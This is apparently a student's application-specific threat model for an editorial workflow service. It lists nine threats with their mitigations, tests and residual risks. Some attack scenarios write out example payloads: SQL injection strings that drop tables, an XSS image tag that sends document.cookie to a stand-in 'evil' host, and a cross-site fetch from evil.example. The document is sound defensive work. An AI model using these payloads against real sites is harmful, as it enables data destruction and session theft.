# Editorial Service — Application-Specific Threat Model

**Component owner:** Salma (Student 2) — Editorial Workflow and Publication Service
**Scope:** `services/editorial-service` (Express API, SQS consumer, publication event publisher, `publicationOutcome` Lambda) and its integration points with Identity, Article and Search.
**Related evidence:** [`security-test-evidence.md`](./security-test-evidence.md) · automated tests in `tests/securityHttp.test.js`, `tests/securityTest.js`, `tests/csrfToken.test.js`, `tests/validation.test.js`, `tests/reviewWorkflow.test.js`

This document applies the group threat model (`docs/threat-model.md`, nine threats) to the Editorial Service. Each threat states the affected component, an attack scenario specific to SupportHub, the impact, the mitigation **as actually implemented** (with file references), how it was verified, and the residual risk. Where a control is owned by another service (for example login), that is stated rather than claimed.

## Editorial attack surface

| Route | Guard chain | Purpose |
|---|---|---|
| `POST /api/articles/:id/submissions` | `requireAuthor` → `requireBrowserWrite` → ownership check | Author submits own draft |
| `GET /api/reviews` | `requireReviewer` | Pending-review queue |
| `POST /api/articles/:id/reviews` | `requireReviewer` → `requireBrowserWrite` → self-review check | Approve / reject |
| `GET /api/articles/:id/history` | `requireReviewer` | Review audit history |
| `PATCH /api/articles/:id/publication` | `requireReviewer` → `requireBrowserWrite` | Publish approved article |
| `GET /api/editorial/published` | `requireReviewer` | Published list |
| `GET /api/editorial/flags` · `POST /api/articles/:id/flags` · `PATCH /api/flags/:id` | `requireReviewer` (+ `requireBrowserWrite` on writes) | Outdated-content flags |
| `POST /api/review-operations/:id/reconcile` · `POST /api/editorial/publication-operations/:id/reconcile` | `requireReviewer` → `requireBrowserWrite` | Reconcile uncertain workflow operations |
| `POST /internal/retry-notifications` | `requireCronSecret` (Bearer, ≥32 chars, constant-time) | Scheduled retry |
| `GET /api/csrf-token` · `GET /api/health` | `requireLogin` · public | CSRF token issue · liveness + DB check |

Database tables owned by Editorial: `editorial_reviews`, `editorial_status_events`, `editorial_outdated_flags`, `publication_outbox`, `editorial_workflow_operations`, `editorial_event_inbox`, `editorial_publication_events`. Sessions live in the shared `user_sessions` table.

---

## T1 — SQL Injection

| | |
|---|---|
| **Affected component** | All Editorial routes with `:id` / `:operationId` parameters; text inputs `comments` (reviews), `reason` / `resolution` (flags); SQS article events; all queries in `services/*.js`. |
| **Attack scenario** | A logged-in reviewer sends `POST /api/articles/1;DROP TABLE editorial_reviews;--/reviews`, or submits a flag reason of `x'); DROP TABLE editorial_outdated_flags;--`, hoping the value is concatenated into SQL. |
| **Impact** | Reading other reviews, forging approvals, deleting workflow/audit tables. |
| **Existing mitigation** | Every query uses `pg` positional parameters (`$1, $2 …`) with a separate values array — no string-built SQL. Route IDs pass through `id()` in `services/http.js`, which now accepts **only plain decimal digits** (rejects `0x1`, `1e3`, signs, whitespace, SQL text) and returns 400 before any query. Text fields are type-checked and length-limited (`text()`, `reviewComments()`), and DB `CHECK` constraints (migrations 001, 007) restrict values. |
| **Security test** | `securityHttp.test.js` S5 (three tests): five SQLi payloads in IDs → **400, zero queries executed**; SQLi payload in flag reason → stored as literal text, absent from SQL text, sent as `$3`; static scan of all Editorial source finds **no** `.query(` call with `${…}` interpolation. `validation.test.js` covers hex/exponent/padded IDs. |
| **Residual risk** | A future developer could add dynamic SQL (e.g. a sortable column); the static-scan test will catch template-literal interpolation but not string concatenation with `+`. The DB user is shared across services, so least-privilege per service is not enforced at the database level. |

## T2 — Cross-Site Scripting (stored / reflected)

| | |
|---|---|
| **Affected component** | Review `comments`, flag `reason` / `resolution` (stored in Editorial DB, displayed in `frontend/review.html` via `frontend/js/editorial.js`); article titles shown in the review queue. |
| **Attack scenario** | An author writes an article titled `<img src=x onerror=fetch('//evil/'+document.cookie)>`; or a reviewer leaves a rejection comment containing `<script>`. When another reviewer opens the queue, the markup would run in their session. |
| **Impact** | Script running as a reviewer could approve/publish articles through the API using that reviewer's session and CSRF token. |
| **Existing mitigation** | The API stores and returns content as JSON data only (`Content-Type: application/json`), never HTML. Helmet sets `X-Content-Type-Options: nosniff` and a CSP of `default-src 'self'; script-src 'self'`. The Editorial frontend writes all user content with `textContent` (no `innerHTML`, `insertAdjacentHTML` or `document.write`). Session cookie is `HttpOnly`, so script cannot read it. |
| **Security test** | S6 (three tests): `<script>`/`onerror` payload stored and returned unchanged as JSON text; real server returns `nosniff` + CSP + no `X-Powered-By`; source check of `frontend/js/editorial.js` confirms `textContent` only. **Manual browser check still to record:** open the review queue with the payload article and screenshot it displaying literally. |
| **Residual risk** | The CSP from Helmet protects API responses; the Cloudflare Pages frontend needs its own CSP in `frontend/_headers` (currently empty). Other teammates' pages must also avoid `innerHTML`. |

## T3 — Broken Object-Level Authorization (BOLA / IDOR)

| | |
|---|---|
| **Affected component** | `POST /api/articles/:id/submissions` (submit), `POST /api/articles/:id/reviews` (decide). |
| **Attack scenario** | Author #10 changes the URL to `/api/articles/42/submissions`, where article 42 belongs to author #99, to push someone else's draft into review. Or a reviewer who wrote article 42 tries to approve it themselves. |
| **Impact** | Workflow manipulation of other authors' content; self-approval bypasses the two-person editorial control. |
| **Existing mitigation** | `reviewService.submit` fetches the article from the Article Service (signed request) and rejects with **403 "Only the author can submit"** unless `article.author_id === session user id`. `reviewService.decide` rejects with **403 "Cannot review your own article"** when the reviewer is the author. Both checks use the authoritative Article record, not client-supplied owner fields. |
| **Security test** | S3 (two HTTP tests): cross-author submit → 403, Article Service status never changed, no DB write; self-approval → 403, no transition. `reviewWorkflow.test.js` also covers self-review. |
| **Residual risk** | Ownership depends on the Article Service returning the correct `author_id`; a compromised Article Service could mislead Editorial. Editing article *content* is enforced by the Article Service (Alyaa), not Editorial. |

## T4 — Broken Function-Level Authorization

| | |
|---|---|
| **Affected component** | All reviewer-only routes (review queue, decisions, publication, flags, reconciliation). |
| **Attack scenario** | A user with role `author` calls `POST /api/articles/42/reviews {"decision":"approved"}` or `PATCH /api/articles/42/publication` directly with curl/Postman, bypassing the UI. |
| **Impact** | Authors approving and publishing their own unreviewed content. |
| **Existing mitigation** | Server-side middleware in `middleware/security.js`: `requireReviewer` allows only `reviewer`, `admin` (and temporary legacy `editor`); `requireAuthor` allows only `author`, `admin`. The role comes from the server-side session, not from the request. |
| **Security test** | S2: author receives **403 "Reviewer permission required"** on approve, publish, review list, flag list and flag resolve, with zero DB or Article calls. `securityTest.js` unit-tests every role combination. |
| **Residual risk** | The legacy `editor` role is still accepted until the privileged account is migrated; remove it afterwards. Role values are trusted from the shared session written by Identity. |

## T5 — Cross-Site Request Forgery

| | |
|---|---|
| **Affected component** | Every state-changing Editorial route (submit, decide, publish, flags, reconcile). |
| **Attack scenario** | A reviewer, logged in to SupportHub, visits `evil.example`, which auto-submits `fetch('https://…/api/articles/42/publication', {method:'PATCH', credentials:'include'})`. |
| **Impact** | Unwanted publication or approval performed with the victim's session. |
| **Existing mitigation** | `requireBrowserWrite`: (1) `Origin` must equal `FRONTEND_ORIGIN`; (2) `X-CSRF-Token` must be 64 hex chars and match the session token via `crypto.timingSafeEqual`. Tokens are issued by `GET /api/csrf-token` from `crypto.randomBytes(32)` and stored server-side. CORS allows only `FRONTEND_ORIGIN`. Cookie is `SameSite=Lax`. |
| **Security test** | S4: missing, malformed and mismatched token → **403 "Invalid CSRF token"**; foreign and missing Origin → **403 "Origin not allowed"**; no DB/Article call for any. `securityTest.js` + `csrfToken.test.js` cover the middleware and token generation. |
| **Residual risk** | Full browser flow (Pages proxy → Editorial with real cookie) should be captured once in the demo. A token is reused for the session's life (no per-request rotation). |

## T6 — Credential Attacks

| | |
|---|---|
| **Affected component** | Login is **owned by the shared Identity service (Alyaa)**, not Editorial. Editorial's exposure: it trusts any valid session in the shared `user_sessions` store; `CRON_SECRET` and `SERVICE_SHARED_SECRET` are Editorial credentials. |
| **Attack scenario** | Password guessing against Identity to obtain a reviewer session; brute-forcing `/internal/retry-notifications` with guessed Bearer secrets. |
| **Impact** | Reviewer takeover → full editorial control; abuse of the retry job. |
| **Existing mitigation** | Editorial: cron secret must be ≥32 chars and is compared in constant time; API-wide rate limiter (300 requests / 15 min / IP) slows guessing. Identity (Alyaa): bcrypt hashing and login rate limiting per the group model. |
| **Security test** | `securityTest.js`: missing, short and wrong cron secrets → 401. S8 shows the limiter returns 429. Login rate-limit and bcrypt evidence (group tests S08/S09) must come from the Identity service. |
| **Residual risk** | Rate-limit counters are in process memory, so they reset on restart and are per-instance on Vercel; a shared store (e.g. Postgres/Redis) would be stronger. |

## T7 — Automated Abuse

| | |
|---|---|
| **Affected component** | Editorial API (all `/api` routes) and the SQS consumer. Cloudflare Turnstile protects registration/feedback in Identity and Search, not Editorial (Editorial has no anonymous write endpoints). |
| **Attack scenario** | A script floods `/api/reviews` or `/api/editorial/flags` to exhaust the DB pool (`max: 5`), or floods the SQS queue with junk `article.submitted` events. |
| **Impact** | Editorial unavailable; review queue polluted. |
| **Existing mitigation** | `express-rate-limit` on `/api` (300 / 15 min, standard `RateLimit` + `Retry-After` headers); JSON body limit 100 KB (413 above that); all writes need an authenticated reviewer/author plus CSRF. SQS consumer validates event shape, deduplicates via `editorial_event_inbox`, and failed messages go to a DLQ after 5 receives. |
| **Security test** | S8: request 301 within the window returns **429** with `Retry-After`. `articleEventService.test.js` / `articleEventConsumer.test.js`: malformed and duplicate events. Turnstile invalid-token evidence (group S07) belongs to Identity/Search. |
| **Residual risk** | Limit is per IP and per instance; distributed attacks are not stopped. No per-user quota on flag creation. |

## T8 — Sensitive Data Exposure

| | |
|---|---|
| **Affected component** | `DATABASE_URL_POOLED`, `SESSION_SECRET`, `SERVICE_SHARED_SECRET`, `CRON_SECRET`, AWS keys; `.env`, `.env.local` and their backups; error responses and logs. |
| **Attack scenario** | A `.env.local.backup-…` file is committed and the repo is shared with examiners; or a 500 error returns a stack trace containing the connection string. |
| **Impact** | Database takeover; ability to forge sessions or signed service calls. |
| **Existing mitigation** | Secrets only from environment variables; service `.gitignore` ignores `.env*` (except `.env.example`, which has placeholders only) and `.vercel/`; root `.gitignore` ignores `.env` / `.env.local`. Startup refuses a `SESSION_SECRET` under 32 chars. Error handler returns a generic `Internal server error` for 5xx and logs server-side only. DB connection uses TLS with `rejectUnauthorized: true`. |
| **Security test** | Git audit (see evidence doc §3): `git ls-files` and `git log --all` checked for tracked env/secret files. Real-server test confirms `X-Powered-By` is removed. |
| **Residual risk** | Anyone who ever had a real secret in a committed file must rotate it — removing the file does not remove it from history. `console.error` of raw errors could still include query fragments in server logs. |

## T9 — Session Hijacking

| | |
|---|---|
| **Affected component** | `supporthub.sid` cookie and the shared Postgres `user_sessions` store used by Identity, Article and Editorial. |
| **Attack scenario** | An attacker steals a reviewer cookie over plain HTTP or via XSS, or forges a cookie value to impersonate a reviewer. |
| **Impact** | Full reviewer access until the session expires. |
| **Existing mitigation** | Cookie is `HttpOnly`, `SameSite=Lax`, `Secure` in production, 8-hour `maxAge`; signed with `SESSION_SECRET` (forged/unsigned values are ignored). Sessions are server-side, so logout in Identity destroys the row and invalidates the session in Editorial too. Editorial re-validates the stored user id on every request (`userFromSession`). Session regeneration on login is done by Identity. |
| **Security test** | S7: forged-signature, unsigned and empty cookies on the real server → **401**; sessions with no user (expired/logged out) or tampered ids → **401**. |
| **Residual risk** | No idle timeout separate from the 8-hour lifetime; no binding to IP/User-Agent. Compromise of `SESSION_SECRET` affects all three services because it is shared. |

---

## Summary

| # | Threat | Editorial mitigation implemented | Automated test | Still to evidence manually |
|---|---|---|---|---|
| T1 | SQL injection | Yes | S5 ×3, validation | — |
| T2 | XSS | Yes (API + Editorial frontend) | S6 ×3 | Browser screenshot |
| T3 | BOLA | Yes | S3 ×2 | — |
| T4 | Function-level authz | Yes | S2, securityTest | — |
| T5 | CSRF | Yes | S4, securityTest, csrfToken | Live browser flow in demo |
| T6 | Credential attacks | Cron secret + rate limit (login is Identity) | securityTest, S8 | Identity login rate limit / bcrypt |
| T7 | Automated abuse | Rate limit, body limit, SQS dedupe/DLQ | S8, event tests | Turnstile (Identity/Search) |
| T8 | Sensitive data exposure | Yes | Git audit | Secret rotation if any were committed |
| T9 | Session hijacking | Yes (cookie + server-side store) | S7 ×2 | Production `Secure` cookie check |
